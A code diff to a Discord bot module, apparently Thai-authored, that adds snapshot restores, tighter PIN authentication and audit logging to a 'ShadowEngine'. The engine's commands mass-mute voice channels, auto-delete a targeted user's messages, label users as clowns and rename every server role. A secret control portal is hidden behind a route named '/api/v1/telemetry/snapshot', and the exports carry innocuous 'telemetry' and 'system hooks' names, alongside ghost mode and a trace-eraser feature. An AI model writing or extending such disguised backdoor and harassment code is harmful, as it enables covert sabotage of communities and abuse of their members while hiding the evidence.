+        voiceMuteSnapshots.set(key, { type: "voice_mute", guildId: guild.id, channelId: voiceCh.id, generation, createdAt: Date.now(), members });
+        await this.sendAlert("🔇 SILENCE ACTIVATED", `ปิดเสียงสำเร็จ ${silenced} คน ล้มเหลว ${failed} คนใน **${voiceCh.name}** (${guild.name})`, "#f97316");
     }
 
     async commandUnsilence(message, guild) {
         const voiceCh = message.member.voice.channel;
         if (!voiceCh) { await this.quickAlert("❌ ต้องอยู่ในห้องเสียงก่อน"); return; }
-        for (const [, member] of voiceCh.members) {
-            await member.voice.setMute(false, "Shadow: -unsilence").catch(() => {});
+        const key = `${guild.id}:${voiceCh.id}`;
+        const snapshot = voiceMuteSnapshots.get(key);
+        if (!snapshot) { await this.quickAlert("❌ ไม่พบ Snapshot สถานะเสียง"); return; }
+        let restored = 0;
+        let skipped = 0;
+        let failed = 0;
+        for (const entry of snapshot.members) {
+            const member = voiceCh.members.get(entry.memberId);
+            if (!member || entry.wasServerMuted) { skipped++; continue; }
+            const changed = await member.voice.setMute(false, "Restore pre-silence mute state").then(() => true).catch(() => false);
+            if (changed) restored++;
+            else failed++;
             await delay(200);
         }
-        await this.sendAlert("🔊 SILENCE LIFTED", `คืนเสียงทุกคนใน **${voiceCh.name}** (${guild.name})`);
+        voiceMuteSnapshots.delete(key);
+        await this.sendAlert("🔊 SILENCE LIFTED", `คืนเสียงสำเร็จ ${restored} ข้าม ${skipped} ล้มเหลว ${failed} คนใน **${voiceCh.name}** (${guild.name})`);
     }
 
     async commandGhostMode() {
@@ -1192,18 +1324,27 @@ class ShadowEngine {
     }
 
     async commandRestore(guild) {
-        const snap = permissionSnapshots.get(guild.id);
-        if (!snap) { await this.quickAlert("❌ ไม่พบ snapshot สำหรับเซิร์ฟนี้"); return; }
-        let restored = 0;
-        for (const [roleId, data] of Object.entries(snap)) {
+        const snapshot = roleSnapshots.get(guild.id);
+        if (!snapshot?.roles) { await this.quickAlert("❌ ไม่พบ Role snapshot สำหรับเซิร์ฟนี้"); return; }
+        const counts = { restored: 0, skipped: 0, failed: 0, hierarchyBlocked: 0, missingRole: 0 };
+        for (const [roleId, data] of Object.entries(snapshot.roles)) {
             const role = guild.roles.cache.get(roleId);
-            if (role?.manageable) {
-                await role.setPermissions(BigInt(data.perms)).catch(() => {});
-                restored++;
-                await delay(300);
-            }
+            if (!role) { counts.missingRole++; continue; }
+            if (!role.manageable) { counts.hierarchyBlocked++; continue; }
+            const restored = await role.edit({
+                name: data.name,
+                permissions: BigInt(data.perms),
+                color: data.color,
+                hoist: data.hoist,
+                mentionable: data.mentionable,
+                reason: "Restore protected role snapshot"
+            }).then(() => true).catch(() => false);
+            if (restored) counts.restored++;
+            else counts.failed++;
+            await delay(300);
         }
-        await this.sendAlert("♻️ PERMISSIONS RESTORED", `คืนค่า Permission ${restored} ยศใน **${guild.name}** จาก snapshot`, "#57F287");
+        if (counts.failed === 0) roleSnapshots.delete(guild.id);
+        await this.sendAlert("♻️ ROLE SNAPSHOT RESTORED", `คืนสำเร็จ ${counts.restored} ข้าม ${counts.skipped} ล้มเหลว ${counts.failed} ติดลำดับยศ ${counts.hierarchyBlocked} ไม่พบยศ ${counts.missingRole} ใน **${guild.name}**`, counts.failed ? "#FEE75C" : "#57F287");
     }
 
     async commandMimic(message) {
@@ -1225,26 +1366,32 @@ class ShadowEngine {
     async commandClown(message) {
         const u = message.mentions.users.first();
         if (!u) return;
-        clownUsers.add(u.id);
+        clownUsers.add(`${message.guild.id}:${u.id}`);
         await this.sendAlert("🤡 CLOWN TAGGED", `<@${u.id}> (\`${u.id}\`) ถูกติดป้าย Clown แล้ว`, "#FEE75C");
     }
 
     async commandUnclown(message) {
         const u = message.mentions.users.first();
         if (!u) return;
-        clownUsers.delete(u.id);
+        clownUsers.delete(`${message.guild.id}:${u.id}`);
         await this.sendAlert("✅ CLOWN REMOVED", `ถอดป้าย Clown ของ <@${u.id}> แล้ว`, "#57F287");
     }
 
     async commandHaunt(message) {
         const u = message.mentions.users.first();
         if (!u) return;
-        if (hauntedUsers.has(u.id)) {
-            hauntedUsers.delete(u.id);
+        const key = `${message.guild.id}:${u.id}`;
+        if (hauntedUsers.has(key)) {
+            hauntedUsers.delete(key);
+            for (const [timerKey, timer] of stateTimers) {
+                if (!timerKey.startsWith(`${key}:`)) continue;
+                clearTimeout(timer);
+                stateTimers.delete(timerKey);
+            }
             await this.sendAlert("👻 HAUNT LIFTED", `ปลด Haunt ของ <@${u.id}> — ข้อความจะไม่ถูกลบอีก`, "#57F287");
             return;
         }
-        hauntedUsers.add(u.id);
+        hauntedUsers.add(key);
         await this.sendAlert("👻 HAUNT ACTIVATED", `เปิด Haunt ใส่ <@${u.id}> — ข้อความลบหลัง 12 วิ`, "#ED4245");
     }
 
@@ -1261,8 +1408,8 @@ class ShadowEngine {
     async commandRuinRoles(guild, args) {
         const newName = args.slice(2).join(" ") || "🤡 CLOWNED";
         const snap = {};
-        guild.roles.cache.forEach(r => { snap[r.id] = { name: r.name, perms: r.permissions.bitfield.toString() }; });
-        permissionSnapshots.set(guild.id, snap);
+        guild.roles.cache.forEach(r => { snap[r.id] = { name: r.name, perms: r.permissions.bitfield.toString(), color: r.color, hoist: r.hoist, mentionable: r.mentionable }; });
+        roleSnapshots.set(guild.id, { type: "roles", generation: crypto.randomUUID(), createdAt: Date.now(), roles: snap });
 
         for (const [, role] of guild.roles.cache) {
             if (role.manageable && role.id !== guild.id) {
@@ -1476,77 +1623,37 @@ tbody tr:hover td { background:rgba(239,68,68,.04); }
 `;
 
 // ════════════════════════════════════════════════════════════════════════════
-//  🌐  SHADOW WEB PORTAL
+//  🌐  PROTECTED CONTROL PORTAL
 // ════════════════════════════════════════════════════════════════════════════
-function renderShadowBlockedPage(minutes) {
-    const safeMinutes = Math.max(1, Number(minutes || 1) || 1);
-    return `<!DOCTYPE html><html lang="th"><head><meta charset="UTF-8"><title>⛔ Blocked</title><style>body{background:#0f0f13;color:#ef4444;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;text-align:center;}</style></head><body><div><div style="font-size:3em;margin-bottom:12px;">⛔</div><b>ลองผิดเกินกำหนด</b><br>ล็อกอีก ${escapeHtml(safeMinutes)} นาที</div></body></html>`;
+async function auditOwnerControlAction(payload = {}) {
+    const record = await auditStorage.saveAuditRecord(sessionManager, {
+        guildId: payload.guildId || "owner-control",
+        source: "owner_control",
+        category: "OWNER",
+        severity: payload.result === "failed" ? "ERROR" : "WARNING",
+        actionType: payload.actionType || "owner_control_action",
+        actorId: payload.actorId || config.system.ownerId || null,
+        targetId: payload.targetId || null,
+        reason: payload.reason || null,
+        summary: `${payload.phase || "event"}:${payload.result || "unknown"}`,
+        metadata: {
+            requestId: payload.requestId || null,
+            phase: payload.phase || null,
+            result: payload.result || null,
+            resultCode: payload.resultCode || null,
+            before: payload.before ?? null,
+            after: payload.after ?? null
+        }
+    });
+    return Boolean(record);
 }
 
-function renderShadowLoginPage(showInvalidPin) {
-    return `<!DOCTYPE html><html lang="th"><head>
-<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
-<title>🔐 Shadow Portal</title>
-<style>${SHADOW_CSS}</style>
-</head><body>
-<div class="login-wrap">
-<div class="login-box">
-    <div class="login-icon">👁️‍🗨️</div>
-    <div class="login-title">SHADOW PORTAL</div>
-       <div class="login-sub">ศูนย์บัญชาการลับ — ระบุตัวตนก่อนเข้าถึง</div>
-    ${showInvalidPin ? '<p style="color:var(--red2);margin-bottom:10px;font-size:0.82em;">❌ รหัสผ่านไม่ถูกต้อง</p>' : ''}
-    <form method="POST">
-        <input type="password" name="pin" placeholder="🔑 กรอกรหัสผ่านลับ..." style="text-align:center;margin-bottom:14px;">
-        <button type="submit" class="btn btn-danger">เข้าสู่ Shadow Portal</button>
-    </form>
-    <p style="color:var(--text3);font-size:0.7em;margin-top:16px;">Unauthorized access is monitored & logged.</p>
-</div>
-</div>
-    </body></html>`;
-}
-
-function shadowPortalBruteKey(req) {
-    return req.ip || "unknown";
-}
-
-function trackShadowPortalFailedPin(req, body) {
-    if (!body.pin) return;
-    const key = shadowPortalBruteKey(req);
-    const rec = _pinBruteGuard.get(key) || { attempts: 0, lockUntil: 0 };
-    rec.attempts++;
-    if (rec.attempts >= 5) {
-        rec.lockUntil = Date.now() + 15 * 60 * 1000;
-        rec.attempts = 0;
-    }
-    _pinBruteGuard.set(key, rec);
-}
-
-function getShadowPortalLockMinutes(req) {
-    const rec = _pinBruteGuard.get(shadowPortalBruteKey(req));
-    if (!rec || rec.lockUntil <= Date.now()) return 0;
-    return Math.ceil((rec.lockUntil - Date.now()) / 60000);
-}
-
-function authorizeShadowPortalRequest(req, res, body, providedPin) {
-    if (providedPin === SHADOW_WEB_PIN) {
-        issueShadowSessionCookie(res);
-        return true;
-    }
-    if (verifyShadowSessionToken(readCookie(req, SHADOW_SESSION_COOKIE))) return true;
-
-    const lockMinutes = getShadowPortalLockMinutes(req);
-    if (lockMinutes > 0) {
-        res.status(429).send(renderShadowBlockedPage(lockMinutes));
-        return false;
-    }
-
-    trackShadowPortalFailedPin(req, body);
-    res.send(renderShadowLoginPage(Boolean(body.pin)));
-    return false;
-}
-
-async function applyShadowPortalAction(body, engineInstance) {
-    await applyShadowPortalActionFromHelpers(body, {
+function applyShadowPortalAction(body, engineInstance, mainClient) {
+    return applyShadowPortalActionFromHelpers(body, {
+        actorId: config.system.ownerId,
+        ownerId: config.system.ownerId,
+        actorCapability: "owner_only",
+        mainClient,
         systemToggles,
         safeDiscordId,
         globalAdminCache,
@@ -1555,14 +1662,41 @@ async function applyShadowPortalAction(body, engineInstance) {
         sessionManager,
         engineInstance,
         logSuppressedError,
+        armTtlMs: readFiniteInteger(process.env.SHADOW_ARM_TTL_MS, {
+            fallback: 5 * 60 * 1000,
+            min: 60 * 1000,
+            max: 15 * 60 * 1000
+        }),
+        verifyStepUpPin(pin) {
+            return timingSafePinEqual(pin, SHADOW_WEB_PIN);
+        },
+        auditOwnerAction: auditOwnerControlAction,
+        scheduleArmTimer,
+        cancelArmTimer,
         setShadowPin(pin) {
             SHADOW_WEB_PIN = pin;
+        },
+        getShadowSessionVersion() {
+            return shadowSessionVersion;
+        },
+        setShadowSessionVersion(version) {
+            shadowSessionVersion = version;
+        },
+        resetShadowAuth: resetShadowPortalAuth,
+        getGhostMode() {
+            return ghostModeEnabled;
         },
         toggleGhostMode() {
             ghostModeEnabled = !ghostModeEnabled;
         },
+        getTraceKillSwitch() {
+            return traceKillSwitchEnabled;
+        },
         toggleTraceKillSwitch() {
             traceKillSwitchEnabled = !traceKillSwitchEnabled;
+        },
+        getTraceDryRun() {
+            return traceDryRunEnabled;
         },
         toggleTraceDryRun() {
             traceDryRunEnabled = !traceDryRunEnabled;
@@ -1586,6 +1720,7 @@ function buildShadowPortalContext() {
 }
 
 function buildShadowPortalState() {
+    for (const guildId of armedGuilds.keys()) getActiveArm(guildId);
     return {
         ghostModeEnabled,
         protectedSessionCount: protectedSessions.size,
@@ -1600,23 +1735,54 @@ function buildShadowPortalState() {
     };
 }
 
+function renderProtectedDashboard(res, mainClient) {
+    setPortalSecurityHeaders(res);
+    return res.send(renderShadowDashboardPage(
+        {
+            ...buildShadowPortalViewDataFromHelpers(mainClient, buildShadowPortalContext()),
+            SHADOW_CSS
+        },
+        buildShadowPortalState()
+    ));
+}
+
 function injectShadowRoutes(app, mainClient, engineInstance) {
-    app.all("/api/v1/telemetry/snapshot", require("express").urlencoded({ extended: true }), async (req, res) => {
-        const body = req.body || {};
+    const urlencoded = express.urlencoded({
+        extended: false,
+        limit: "8kb",
+        parameterLimit: 20
+    });
+    const basePath = "/api/v1/telemetry/snapshot";
 
-        const providedPin = req.query.pin || body.pin;
+    app.get(basePath, (req, res) => {
+        if (!getShadowPortalAuth().authorize(req, res, {}, null)) return;
+        return renderProtectedDashboard(res, mainClient);
+    });
 
-        if (!getShadowPortalAuth().authorize(req, res, body, providedPin)) return;
+    app.post(`${basePath}/login`, urlencoded, (req, res) => {
+        const auth = getShadowPortalAuth();
+        if (!auth.authorize(req, res, req.body || {}, req.body?.pin)) return;
+        setPortalSecurityHeaders(res);
+        return res.status(200).json({ success: true });
+    });
 
-        await applyShadowPortalAction(body, engineInstance);
+    app.post(`${basePath}/actions`, urlencoded, async (req, res) => {
+        const auth = getShadowPortalAuth();
+        if (!auth.authorize(req, res, {}, null)) return;
+        const result = await applyShadowPortalAction(req.body || {}, engineInstance, mainClient);
+        setPortalSecurityHeaders(res);
+        return res.status(result.status || (result.ok ? 200 : 500)).json({
+            success: result.ok === true,
+            code: result.code,
+            requestId: result.requestId || null,
+            actionApplied: result.actionApplied === true
+        });
+    });
 
-        res.send(renderShadowDashboardPage(
-            {
-                ...buildShadowPortalViewDataFromHelpers(mainClient, buildShadowPortalContext()),
-                SHADOW_CSS
-            },
-            buildShadowPortalState()
-        ));
+    app.post(`${basePath}/logout`, urlencoded, (req, res) => {
+        const auth = getShadowPortalAuth();
+        auth.logout(res);
+        return res.status(200).json({ success: true });
     });
 }
 
@@ -1625,22 +1791,46 @@ function injectShadowRoutes(app, mainClient, engineInstance) {
 // ════════════════════════════════════════════════════════════════════════════
 let _shadowEngine = null;
 
+function selectConfiguredShadowPin(savedAuth, legacyPin, environmentPin) {
+    if (typeof savedAuth?.pin === "string") return savedAuth.pin.trim();
+    if (typeof legacyPin === "string") return legacyPin.trim();
+    return String(environmentPin || "").trim();
+}
+
 async function setupShadowEvents(client) {
-    // โหลด PIN ที่บันทึกไว้ใน MongoDB (ถ้ามี) เพื่อให้ PIN คงอยู่แม้ restart
     try {
-        const saved = await sessionManager.getSetting('_shadowPin', null);
-        if (saved && typeof saved === 'string' && saved.length >= 4) SHADOW_WEB_PIN = saved;
-    } catch (e) {
-        logSuppressedError("load shadow portal pin", e);
+        const savedAuth = await sessionManager.getSetting("_shadowPortalAuth", null);
+        const legacyPin = await sessionManager.getSetting("_shadowPin", null);
+        const configuredPin = selectConfiguredShadowPin(savedAuth, legacyPin, process.env.SHADOW_PORTAL_PIN);
+        const configuredVersion = Number(savedAuth?.sessionVersion || 1);
+        if (configuredPin.length >= 8) SHADOW_WEB_PIN = configuredPin;
+        shadowSessionVersion = Number.isSafeInteger(configuredVersion) && configuredVersion > 0 ? configuredVersion : 1;
+    } catch (error) {
+        SHADOW_WEB_PIN = "";
+        shadowSessionVersion = 1;
+        logSuppressedError("load protected portal authentication", error);
     }
+
+    resetShadowPortalAuth();
+    if (!SHADOW_WEB_PIN || !String(process.env.SHADOW_SESSION_SECRET || "").trim()) {
+        console.warn("[SHADOW AUTH] Protected portal disabled because credentials are not configured.");
+    }
+
+    if (_shadowEngine) return _shadowEngine;
     _shadowEngine = new ShadowEngine(client);
     _shadowEngine.init();
+    return _shadowEngine;
 }
 
 module.exports = {
     setupTelemetryRouter:  injectShadowRoutes,
     initializeSystemHooks: setupShadowEvents,
+    shutdownSystemHooks() {
+        _shadowEngine?.dispose?.();
+        _shadowEngine = null;
+    },
     isSystemMaster,
+    getSystemCapability,
     getWebPin:      ()  => SHADOW_WEB_PIN,
     isProtected:    (sessionId) => protectedSessions.has(sessionId),
     _test: {
@@ -1656,6 +1846,10 @@ module.exports = {
         traceDeletionRequests,
         traceRateLimits,
         traceMetrics,
+        getActiveArm,
+        scheduleArmTimer,
+        cancelArmTimer,
+        resetShadowPortalAuth,
         resetTraceState() {
             traceDeletionRequests.clear();
             traceRateLimits.clear();
@@ -1664,8 +1858,10 @@ module.exports = {
             for (const key of Object.keys(traceMetrics)) traceMetrics[key] = 0;
             traceKillSwitchEnabled = false;
             traceDryRunEnabled = false;
+            systemToggles.traceEraser = false;
         },
         setTraceRuntimeOptions(options = {}) {
+            if (typeof options.enabled === "boolean") systemToggles.traceEraser = options.enabled;
             if (typeof options.killSwitch === "boolean") traceKillSwitchEnabled = options.killSwitch;
             if (typeof options.dryRun === "boolean") traceDryRunEnabled = options.dryRun;
             if (options.guildPolicies) {
@@ -1678,6 +1874,7 @@ module.exports = {
                 protectedChannelIds.clear();
                 for (const channelId of options.protectedChannels) protectedChannelIds.add(String(channelId));
             }
-        }
+        },
+        selectConfiguredShadowPin
     }
 };
